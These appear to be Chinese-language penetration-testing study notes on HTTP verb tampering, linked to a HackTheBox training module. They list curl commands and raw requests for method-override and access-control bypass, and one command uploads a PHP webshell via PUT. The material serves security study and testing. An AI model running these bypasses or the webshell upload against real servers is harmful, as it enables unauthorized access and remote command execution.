# HTTP Verb Tampering

HTTP Verb Tampering（HTTP 動詞篡改）是一種 Web 安全漏洞，攻擊者透過變更 HTTP Method（如 `GET`、`POST`、`PUT`、`DELETE`）來繞過伺服器的訪問控制機制，進行未授權操作或敏感數據存取。

## <mark style="color:red;">**1. 發現點**</mark>

* 登入
* 登記
* 403 禁止
* 禁止

## <mark style="color:red;">**2. 測試Payload**</mark>

**1️⃣ 嘗試不同 HTTP 動詞**

常見測試：

```
# 測試是否能繞過身份驗證
curl -X GET http://target.com/admin
curl -X PUT http://target.com/admin
curl -X DELETE http://target.com/admin
​
# 測試 HEAD 是否會洩露敏感資訊
curl -X HEAD http://target.com/admin -i
​
# 利用 TRACE 進行 XST（跨站追蹤攻擊）
curl -X TRACE http://target.com/admin -i
​
# 測試 X-HTTP-Method-Override
curl -X POST http://target.com/admin -H "X-HTTP-Method-Override: DELETE"
```

```
GET /admin
POST /admin
PUT /admin
DELETE /admin
HEAD /admin
OPTIONS /admin
TRACE /admin
```

> **目的**：檢測是否能繞過權限驗證或執行不該允許的操作。

**2️⃣ 變形 HTTP 動詞**

有些伺服器可能不嚴格檢查標準 HTTP 方法，可以測試變形動詞：

```
GETT /admin
POSTT /admin
X-HTTP-Method-Override: PUT
```

> **目的**：測試是否能繞過黑名單或解析異常導致的安全漏洞。

**3️⃣ `X-HTTP-Method-Override`**

某些應用允許透過 `X-HTTP-Method-Override` 來覆寫 HTTP 方法：

```
POST /admin
X-HTTP-Method-Override: DELETE
```

> **目的**：檢查應用是否支援此機制，並嘗試執行未授權操作。

**4️⃣ `X-Method-Override` 及其他變形**

某些應用可能允許不同標頭變種：

```
X-Method-Override: PUT
X-HTTP-Method: DELETE
X-Override-Method: PATCH
```

> **目的**：檢測伺服器是否支援不同名稱的覆寫標頭。

## <mark style="color:red;">**3. bypass技巧**</mark>

* **混淆 HTTP 動詞**
  * `GET /admin HTTP/1.1\r\nPOST / HTTP/1.1`
  * `HEAD /admin` （可能繞過日誌記錄）
*   **利用 `OPTIONS`**

    ```
    OPTIONS /admin HTTP/1.1
    ```

    * 查看允許的 HTTP 方法，確認可用的攻擊向量。
*   **拆分請求**

    ```
    GET /admin HTTP/1.1
    Host: target.com
    Content-Length: 0

    PUT /admin HTTP/1.1
    ```

    > **目的**：測試是否能透過拆分請求繞過安全檢查。
* **攔截請求篡改**
  * 使用 Burp Suite 攔截請求，修改 HTTP 方法後轉發。

## <mark style="color:red;">4. 濫用</mark>

#### **🚀 進一步攻擊方向**

1.  **利用 `DELETE` 或 `PUT` 進行數據破壞或上傳 Webshell**

    ```bash
    curl -X PUT http://target.com/uploads/shell.php --data "<?php system($_GET['cmd']); ?>"
    ```
2. **結合 IDOR（不安全的直接對象參照）漏洞**
   * 測試 `PUT /user/1234` 是否可以修改其他用戶的數據。
3. **利用 `TRACE` 進行 XST**
   * 如果 `TRACE` 啟用，結合 JavaScript 嘗試竊取 HTTP Header（如 Cookie）。

## <mark style="color:red;">5.Skills Assessment</mark>

[<mark style="color:red;">https://academy.hackthebox.com/module/134/section/1219</mark>](https://academy.hackthebox.com/module/134/section/1219)

